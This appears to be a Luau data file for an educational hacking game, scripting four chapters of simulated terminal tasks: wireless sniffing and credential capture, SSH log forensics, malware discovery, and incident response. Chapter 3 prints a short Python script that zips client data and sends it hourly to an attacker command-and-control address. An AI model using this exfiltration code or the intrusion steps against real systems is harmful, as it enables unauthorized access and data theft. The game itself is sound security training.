--[[
    ScenarioData.luau
    ─────────────────────────────────────────────────────────────────
    All chapter definitions for the CyberGame HackTablet.
    Each chapter is a keyed table with:
      • type            "terminal"
      • title / objective / welcomeMessage
      • steps[]         ordered list of tasks the player must complete

    Each step:
      • id              unique string identifier
      • instruction     shown in the tablet HUD above the terminal
      • hint            shown on request or on wrong command
      • validCommands   list of accepted input strings (lowercase-compared)
      • matchPrefix     if true, input only needs to START with one of validCommands
      • output          text the terminal prints when the command is correct
      • isLastStep      true on the final step of a chapter
--]]

local ScenarioData = {}

-- ════════════════════════════════════════════════════════════════════
--  CHAPTER 1 — Active Reconnaissance & Piggybacking
-- ════════════════════════════════════════════════════════════════════
ScenarioData.Chapter1_Recon = {
    type      = "terminal",
    title     = "Chapter 1: Active Reconnaissance",
    objective = "Discover vulnerabilities and gain access to the building network.",

    welcomeMessage = [[
╔══════════════════════════════════════════════════╗
║          HACKTABLET v2.4  —  RECON MODE          ║
║   Objective: Scan networks & capture packets     ║
╚══════════════════════════════════════════════════╝
You are standing outside NovaTech HQ.
Several wireless networks are broadcasting nearby.

Type  help  to see available commands.
]],

    steps = {

        -- STEP 1 ─────────────────────────────────────────────────
        {
            id           = "help",
            instruction  = "Start by viewing all available commands. Type:  help",
            hint         = "Type:  help",
            validCommands = { "help" },
            output = [[
Available Commands:
  help                              — Show this help menu
  scan                              — Scan for nearby wireless networks
  sniff <SSID>                      — Capture packets from a target network
  connect <SSID> --creds <user:pass>— Connect to a network with credentials
  clear                             — Clear the terminal screen

Use these commands in order to complete Chapter 1.
]],
        },

        -- STEP 2 ─────────────────────────────────────────────────
        {
            id           = "scan",
            instruction  = "Scan for nearby wireless networks. Type:  scan",
            hint         = "Type:  scan",
            validCommands = { "scan" },
            output = [[
[*] Scanning for wireless networks...
[*] 3 networks discovered:

  SSID                  BSSID               CH   ENC     SIGNAL
  ──────────────────────────────────────────────────────────────
  NovaTech_Corporate    AA:BB:CC:DD:EE:01    6   WPA3    ████░░
  NovaTech_Guest        AA:BB:CC:DD:EE:02   11   WEP     █████░  ← WEAK
  NovaTech_IOT          AA:BB:CC:DD:EE:03    1   OPEN    ███░░░  ← UNSECURED

[!] WEP and OPEN networks are vulnerable to packet sniffing.
[*] Sniff the weak guest network:  sniff NovaTech_Guest
]],
        },

        -- STEP 3 ─────────────────────────────────────────────────
        {
            id           = "sniff",
            instruction  = "Capture packets from the weak guest network. Type:  sniff NovaTech_Guest",
            hint         = "Type:  sniff NovaTech_Guest",
            validCommands = { "sniff novatech_guest" },
            output = [[
[*] Starting packet capture on NovaTech_Guest (WEP)...
[*] Cracking WEP key... Done.  Key: 0xDEADBEEF42
[*] Monitoring live traffic...

  PKT #001  192.168.1.5  → 192.168.1.1    DNS   Query: fileserver.local
  PKT #002  192.168.1.5  → 192.168.1.1    HTTP  POST /login
            Payload: username=admin&password=Adm1n@NovaTech2024
  PKT #003  192.168.1.9  → 8.8.8.8        DNS   Query: google.com
  PKT #004  192.168.1.5  → 192.168.1.50   FTP   PASS s3cr3t_ftp_pass

[!] Credentials captured in plaintext:
    → admin       : Adm1n@NovaTech2024    (HTTP login)
    → ftp_user    : s3cr3t_ftp_pass       (FTP)
    → Target host : fileserver.local

[*] Credentials auto-saved to /loot/credentials.txt
[*] Now piggyback onto the internal network:
    connect NovaTech_Guest --creds admin:Adm1n@NovaTech2024
]],
        },

        -- STEP 4 (final) ─────────────────────────────────────────
        {
            id           = "connect",
            instruction  = "Connect to the internal network using captured credentials.\nType:  connect NovaTech_Guest --creds admin:Adm1n@NovaTech2024",
            hint         = "Type:  connect NovaTech_Guest --creds admin:Adm1n@NovaTech2024",
            validCommands = { "connect novatech_guest" },
            matchPrefix  = true,   -- accept anything starting with "connect novatech_guest"
            output = [[
[*] Connecting to NovaTech_Guest using captured credentials...
[*] Authenticating... Success.
[*] DHCP lease obtained: 192.168.1.77
[*] You are now inside the NovaTech building network.

╔══════════════════════════════════════════════════╗
║            CHAPTER 1 COMPLETE  ✓                 ║
╠══════════════════════════════════════════════════╣
║  Concepts Learned:                               ║
║  ✓ Active Reconnaissance — scanning live nets    ║
║  ✓ Packet Sniffing       — capturing plaintext   ║
║  ✓ Weak Encryption       — WEP cracked instantly ║
║  ✓ Piggybacking          — unauthorized access   ║
╚══════════════════════════════════════════════════╝

→  Proceed to Chapter 2: SSH into the file server.
   Credentials : admin / Adm1n@NovaTech2024
   Target      : fileserver.local
]],
            isLastStep = true,
        },
    },
}

-- ════════════════════════════════════════════════════════════════════
--  CHAPTER 2 — SSH Connection & Log Checking
-- ════════════════════════════════════════════════════════════════════
ScenarioData.Chapter2_SSH = {
    type      = "terminal",
    title     = "Chapter 2: SSH Connection & Log Analysis",
    objective = "Access the compromised server and identify the attacker.",

    welcomeMessage = [[
╔══════════════════════════════════════════════════╗
║        HACKTABLET v2.4  —  FORENSICS MODE        ║
║   Objective: Investigate the file server         ║
╚══════════════════════════════════════════════════╝
Credentials found in Chapter 1:
  User   : admin
  Pass   : Adm1n@NovaTech2024
  Target : fileserver.local

Type  ssh admin@fileserver.local  to begin.
]],

    steps = {

        -- STEP 1 ─────────────────────────────────────────────────
        {
            id           = "ssh_connect",
            instruction  = "Connect to the file server via SSH.\nType:  ssh admin@fileserver.local",
            hint         = "Type:  ssh admin@fileserver.local",
            validCommands = { "ssh admin@fileserver.local" },
            output = [[
[*] Connecting to fileserver.local port 22...
RSA key fingerprint is SHA256:xK9mNpQ3rL2vT7wY1aB4cD6eF8gH0iJ.
Are you sure you want to continue connecting? (yes/no) yes

admin@fileserver.local's password: *********************

Last login: Tue Apr  8 03:42:17 2025 from 45.33.32.156

[!] WARNING: Last login was from an UNKNOWN external IP: 45.33.32.156

admin@fileserver:~$
]],
        },

        -- STEP 2 ─────────────────────────────────────────────────
        {
            id           = "ls_logs",
            instruction  = "List the log directory to find relevant files.\nType:  ls /var/log",
            hint         = "Type:  ls /var/log",
            validCommands = { "ls /var/log", "ls -la /var/log", "ls -l /var/log" },
            output = [[
admin@fileserver:~$ ls /var/log
auth.log     auth.log.1     syslog
kern.log     dpkg.log       apt/
nginx/       fail2ban.log   lastlog

[*] auth.log contains all login records.
[*] Read it with:  cat /var/log/auth.log
]],
        },

        -- STEP 3 ─────────────────────────────────────────────────
        {
            id           = "read_authlog",
            instruction  = "Inspect the authentication log for suspicious logins.\nType:  cat /var/log/auth.log",
            hint         = "Type:  cat /var/log/auth.log",
            validCommands = { "cat /var/log/auth.log" },
            output = [[
admin@fileserver:~$ cat /var/log/auth.log
Apr  6 09:14:01 fileserver sshd: Accepted password for admin from 192.168.1.10 port 54012
Apr  6 22:31:45 fileserver sshd: Failed password for admin from 45.33.32.156 port 41337
Apr  6 22:31:46 fileserver sshd: Failed password for admin from 45.33.32.156 port 41338
Apr  6 22:31:47 fileserver sshd: Accepted password for admin from 45.33.32.156 port 41339
Apr  7 03:42:17 fileserver sshd: Accepted password for admin from 45.33.32.156 port 41350
Apr  7 03:43:55 fileserver sshd: session opened for user admin from 45.33.32.156
Apr  7 04:12:33 fileserver sshd: session closed for user admin from 45.33.32.156
Apr  9 08:00:01 fileserver sshd: Accepted password for admin from 192.168.1.77 port 55001

[!] Attacker IP identified: 45.33.32.156
    Two failed attempts immediately followed by a successful breach on Apr 6-7.
[*] Search for files modified during the breach window:
    find / -mtime -3 -type f 2>/dev/null
]],
        },

        -- STEP 4 (final) ─────────────────────────────────────────
        {
            id           = "find_modified",
            instruction  = "Find files modified in the last 3 days.\nType:  find / -mtime -3 -type f 2>/dev/null",
            hint         = "Type:  find / -mtime -3 -type f 2>/dev/null",
            validCommands = { "find / -mtime -3 -type f 2>/dev/null", "find / -mtime -3", "find /" },
            matchPrefix  = true,
            output = [[
admin@fileserver:~$ find / -mtime -3 -type f 2>/dev/null
/var/log/auth.log
/home/admin/.bash_history
/tmp/exfil.sh
/tmp/.hidden_proc
/etc/cron.d/persistence
/opt/novatech/client_data/records_backup.zip

[!] Suspicious files flagged:
    → /tmp/exfil.sh            — Unknown script (not installed by admin)
    → /tmp/.hidden_proc        — Hidden binary (dot-prefixed to evade ls)
    → /etc/cron.d/persistence  — Unauthorized cron job (persistence mechanism)

╔══════════════════════════════════════════════════╗
║            CHAPTER 2 COMPLETE  ✓                 ║
╠══════════════════════════════════════════════════╣
║  Concepts Learned:                               ║
║  ✓ SSH Access         — remote login to server   ║
║  ✓ Log Analysis       — reading auth.log         ║
║  ✓ Forensic Discovery — finding modified files   ║
╚══════════════════════════════════════════════════╝

→  Proceed to Chapter 3: Malware Discovery.
   Attacker IP : 45.33.32.156
]],
            isLastStep = true,
        },
    },
}

-- ════════════════════════════════════════════════════════════════════
--  CHAPTER 3 — Malware Discovery & Network Tracing
-- ════════════════════════════════════════════════════════════════════
ScenarioData.Chapter3_Malware = {
    type      = "terminal",
    title     = "Chapter 3: Malware Discovery & Network Tracing",
    objective = "Find the malware and trace the attacker's command-and-control server.",

    welcomeMessage = [[
╔══════════════════════════════════════════════════╗
║       HACKTABLET v2.4  —  MALWARE ANALYSIS       ║
║   Objective: Detect exfiltration, trace C2       ║
╚══════════════════════════════════════════════════╝
Chapter 2 revealed suspicious files on the server.
Now investigate processes, connections, and scripts.

Tools available:  ps  |  netstat  |  grep  |  cat  |  scan --malware
]],

    steps = {

        -- STEP 1 ─────────────────────────────────────────────────
        {
            id           = "ps_aux",
            instruction  = "List all running processes to find malicious ones.\nType:  ps aux",
            hint         = "Type:  ps aux",
            validCommands = { "ps aux", "ps -aux", "ps" },
            matchPrefix  = true,
            output = [[
admin@fileserver:~$ ps aux
USER       PID   %CPU  %MEM  COMMAND
root         1    0.0   0.1  /sbin/init
root       412    0.0   0.2  /usr/sbin/sshd -D
admin     1042    0.1   0.3  bash
root      3847   98.2   1.4  /tmp/.hidden_proc      ← HIGH CPU + HIDDEN PATH
root      3901    0.3   0.2  python3 /tmp/exfil.sh  ← EXFILTRATION SCRIPT
admin     4201    0.0   0.1  ps aux

[!] Suspicious processes detected:
    → PID 3847 : /tmp/.hidden_proc     (98% CPU — C2 beacon / cryptominer)
    → PID 3901 : python3 /tmp/exfil.sh (active data exfiltration)

[*] Check outbound connections:  netstat -an
]],
        },

        -- STEP 2 ─────────────────────────────────────────────────
        {
            id           = "netstat",
            instruction  = "Check active network connections for C2 traffic.\nType:  netstat -an",
            hint         = "Type:  netstat -an",
            validCommands = { "netstat -an", "netstat -a", "netstat" },
            matchPrefix  = true,
            output = [[
admin@fileserver:~$ netstat -an
Active Internet connections:
Proto   Local Address            Foreign Address          State
tcp     0.0.0.0:22               0.0.0.0:*                LISTEN
tcp     192.168.1.50:22          192.168.1.77:55001        ESTABLISHED
tcp     192.168.1.50:54321       45.33.32.156:8443         ESTABLISHED  ← C2 BEACON
tcp     192.168.1.50:54322       45.33.32.156:443          TIME_WAIT
udp     0.0.0.0:68               0.0.0.0:*

[!] Active command-and-control connection detected:
    → Local  : 192.168.1.50:54321
    → Remote : 45.33.32.156:8443   (attacker's C2 server)

[*] Confirm with log search:  grep "failed login" /var/log/auth.log
]],
        },

        -- STEP 3 ─────────────────────────────────────────────────
        {
            id           = "grep_logs",
            instruction  = "Search auth.log for failed login attempts.\nType:  grep \"failed login\" /var/log/auth.log",
            hint         = [[Type:  grep "failed login" /var/log/auth.log]],
            validCommands = {
                'grep "failed login" auth.log',
                'grep "failed login" /var/log/auth.log',
                "grep failed /var/log/auth.log",
                "grep failed auth.log",
            },
            matchPrefix  = true,
            output = [[
admin@fileserver:~$ grep "failed login" /var/log/auth.log
Apr  6 22:31:45 fileserver sshd: Failed password for admin from 45.33.32.156 port 41337
Apr  6 22:31:46 fileserver sshd: Failed password for admin from 45.33.32.156 port 41338

[*] 2 brute-force attempts from 45.33.32.156 before successful breach.
[*] Read the exfiltration script to understand what data was stolen:
    cat /tmp/exfil.sh
]],
        },

        -- STEP 4 ─────────────────────────────────────────────────
        {
            id           = "read_malware",
            instruction  = "Read the exfiltration script to understand the malware.\nType:  cat /tmp/exfil.sh",
            hint         = "Type:  cat /tmp/exfil.sh",
            validCommands = { "cat /tmp/exfil.sh" },
            output = [[
admin@fileserver:~$ cat /tmp/exfil.sh
#!/usr/bin/env python3
# ── Data Exfiltration Script ── installed by remote attacker ──────
import os, socket, zipfile, time

C2_HOST = "45.33.32.156"
C2_PORT = 8443
TARGET  = "/opt/novatech/client_data/"

def exfiltrate():
    with zipfile.ZipFile("/tmp/loot.zip", "w") as z:
        for f in os.listdir(TARGET):
            z.write(TARGET + f)
    s = socket.socket()
    s.connect((C2_HOST, C2_PORT))
    with open("/tmp/loot.zip", "rb") as f:
        s.sendall(f.read())
    s.close()

while True:
    exfiltrate()
    time.sleep(3600)   # runs silently every hour
# ──────────────────────────────────────────────────────────────────

[!] MALWARE IDENTIFIED:
    → C2 Server     : 45.33.32.156
    → Target data   : /opt/novatech/client_data/
    → Sending to    : 45.33.32.156:8443 every hour
    → Started at    : Apr 7 03:44:02 (right after attacker logged in)

[*] Run built-in HackTablet scanner to confirm all threats:
    scan --malware
]],
        },

        -- STEP 5 (final) ─────────────────────────────────────────
        {
            id           = "malware_scan",
            instruction  = "Run the HackTablet malware scanner to confirm all threats.\nType:  scan --malware",
            hint         = "Type:  scan --malware",
            validCommands = { "scan --malware" },
            matchPrefix  = true,
            output = [[
[*] HackTablet Malware Scanner v1.3
[*] Scanning full filesystem...

  THREAT  /tmp/exfil.sh              DataExfil.Python.C2
  THREAT  /tmp/.hidden_proc          Trojan.Miner.Hidden
  THREAT  /etc/cron.d/persistence    Persistence.Cron.Backdoor
  THREAT  /tmp/loot.zip              StolenData.Archive
  CLEAN   /usr/bin/*
  CLEAN   /etc/ssh/sshd_config

╔══════════════════════════════════════════════════╗
║            CHAPTER 3 COMPLETE  ✓                 ║
╠══════════════════════════════════════════════════╣
║  Concepts Learned:                               ║
║  ✓ Process Monitoring   — ps revealed hidden PIDs║
║  ✓ Network Tracing      — netstat found C2 conn  ║
║  ✓ Data Exfiltration    — script logic decoded   ║
║  ✓ Malware Analysis     — all threats catalogued ║
╚══════════════════════════════════════════════════╝

→  Proceed to Chapter 4: Incident Response.
   Attacker IP      : 45.33.32.156
   Malicious PIDs   : 3847, 3901
   Malware files    : /tmp/exfil.sh  /tmp/.hidden_proc
]],
            isLastStep = true,
        },
    },
}

-- ════════════════════════════════════════════════════════════════════
--  CHAPTER 4 — Incident Response & System Hardening
-- ════════════════════════════════════════════════════════════════════
ScenarioData.Chapter4_IncidentResponse = {
    type      = "terminal",
    title     = "Chapter 4: Incident Response & System Hardening",
    objective = "Stop the attacker, remove all malware, and harden the system.",

    welcomeMessage = [[
╔══════════════════════════════════════════════════╗
║      HACKTABLET v2.4  —  INCIDENT RESPONSE       ║
║   Objective: Contain · Eradicate · Recover       ║
╚══════════════════════════════════════════════════╝
The attacker (45.33.32.156) is ACTIVELY connected.
Data is being exfiltrated RIGHT NOW.

Follow the 4-step incident response plan:
  1. Block attacker IP via firewall
  2. Kill malicious processes
  3. Remove malware files
  4. Reset compromised credentials
]],

    steps = {

        -- STEP 1 ─────────────────────────────────────────────────
        {
            id           = "block_ip",
            instruction  = "Block the attacker's IP with the firewall immediately.\nType:  sudo ufw block 45.33.32.156",
            hint         = "Type:  sudo ufw block 45.33.32.156",
            validCommands = { "sudo ufw block 45.33.32.156", "ufw block 45.33.32.156" },
            output = [[
admin@fileserver:~$ sudo ufw block 45.33.32.156
[sudo] password for admin: *********************

Rule added: DENY IN  from 45.33.32.156
Rule added: DENY OUT to   45.33.32.156

[✓] Firewall rule ACTIVE. 45.33.32.156 is now BLOCKED.
[✓] Outbound C2 beacon on port 8443 — connection TERMINATED.
[✓] Exfiltration to attacker server — STOPPED.

[*] Next — kill malicious processes:  kill 3847
]],
        },

        -- STEP 2 ─────────────────────────────────────────────────
        {
            id           = "kill_process",
            instruction  = "Kill the hidden malicious process.\nType:  kill 3847",
            hint         = "Type:  kill 3847",
            validCommands = {
                "kill 3847",
                "kill -9 3847",
                "sudo kill 3847",
                "sudo kill -9 3847",
            },
            output = [[
admin@fileserver:~$ kill 3847
[✓] Signal sent to PID 3847 (/tmp/.hidden_proc) — process terminated.

admin@fileserver:~$ kill 3901
[✓] Signal sent to PID 3901 (python3 /tmp/exfil.sh) — process terminated.

[*] Verify with:  ps aux   (no malicious PIDs should remain)

  USER      PID   %CPU  COMMAND
  root        1    0.0  /sbin/init
  root      412    0.0  /usr/sbin/sshd -D
  admin    1042    0.1  bash
  admin    4280    0.0  ps aux

[✓] All malicious processes terminated.

[*] Next — remove malware files:  rm /tmp/malicious_script.sh
]],
        },

        -- STEP 3 ─────────────────────────────────────────────────
        {
            id           = "remove_malware",
            instruction  = "Delete all malware files from the server.\nType:  rm /tmp/malicious_script.sh",
            hint         = "Type:  rm /tmp/malicious_script.sh",
            validCommands = {
                "rm /tmp/malicious_script.sh",
                "rm /tmp/exfil.sh",
                "rm -rf /tmp/exfil.sh",
                "rm -f /tmp/exfil.sh",
            },
            matchPrefix  = true,
            output = [[
admin@fileserver:~$ rm /tmp/malicious_script.sh
admin@fileserver:~$ rm /tmp/exfil.sh
admin@fileserver:~$ rm /tmp/.hidden_proc
admin@fileserver:~$ rm /tmp/loot.zip
admin@fileserver:~$ crontab -r -u root

[✓] Malware files removed:
    → /tmp/exfil.sh              deleted
    → /tmp/.hidden_proc          deleted
    → /tmp/malicious_script.sh   deleted
    → /tmp/loot.zip              deleted
    → /etc/cron.d/persistence    removed (persistence backdoor gone)

[*] Next — reset the compromised admin password:  passwd admin
]],
        },

        -- STEP 4 ─────────────────────────────────────────────────
        {
            id           = "change_password",
            instruction  = "Reset the compromised admin password.\nType:  passwd admin",
            hint         = "Type:  passwd admin",
            validCommands = { "passwd admin", "passwd" },
            output = [[
admin@fileserver:~$ passwd admin
Changing password for admin.
Current password: *********************
New password:     *********************
Retype new password: *********************
passwd: password updated successfully.

[✓] Admin password changed. Old credentials invalidated.
[✓] Attacker can no longer use: admin / Adm1n@NovaTech2024

[!] FINAL CHALLENGE INCOMING...
    The attacker is attempting one last desperate login.
    Type:  monitor --watch   to observe and confirm your defenses.
]],
        },

        -- STEP 5 — Final Challenge (final) ───────────────────────
        {
            id           = "final_challenge",
            instruction  = "Watch the final intrusion attempt to confirm your defenses held.\nType:  monitor --watch",
            hint         = "Type:  monitor --watch",
            validCommands = { "monitor --watch", "monitor" },
            matchPrefix  = true,
            output = [[
[*] Live SSH connection monitor active...

  Apr 11 14:55:01  Attempt from 45.33.32.156:41999 — BLOCKED by UFW firewall
  Apr 11 14:55:03  Attempt from 45.33.32.156:42001 — BLOCKED by UFW firewall
  Apr 11 14:55:06  Attempt from 45.33.32.156:42003 — BLOCKED by UFW firewall
  Apr 11 14:55:09  Attempt from 45.33.32.156:42010 — Password REJECTED (changed)
  Apr 11 14:55:11  fail2ban: 45.33.32.156 auto-banned after 5 failed attempts.

[✓] ALL INTRUSION ATTEMPTS FAILED.
[✓] System is secure.

╔══════════════════════════════════════════════════╗
║        CHAPTER 4 COMPLETE  ✓  SYSTEM SECURED     ║
╠══════════════════════════════════════════════════╣
║  ✓ Firewall Block    — 45.33.32.156 denied       ║
║  ✓ Processes Killed  — no malware running        ║
║  ✓ Malware Removed   — all files deleted         ║
║  ✓ Password Changed  — credentials rotated       ║
╚══════════════════════════════════════════════════╝

╔══════════════════════════════════════════════════╗
║       🎓  ALL CHAPTERS COMPLETE — WELL DONE!     ║
╠══════════════════════════════════════════════════╣
║  Skills Mastered:                                ║
║  ✓ Active Reconnaissance   ✓ Packet Sniffing     ║
║  ✓ SSH Forensics           ✓ Log Analysis        ║
║  ✓ Malware Analysis        ✓ Process Monitoring  ║
║  ✓ Incident Response       ✓ System Hardening    ║
╚══════════════════════════════════════════════════╝
]],
            isLastStep = true,
        },
    },
}

return ScenarioData
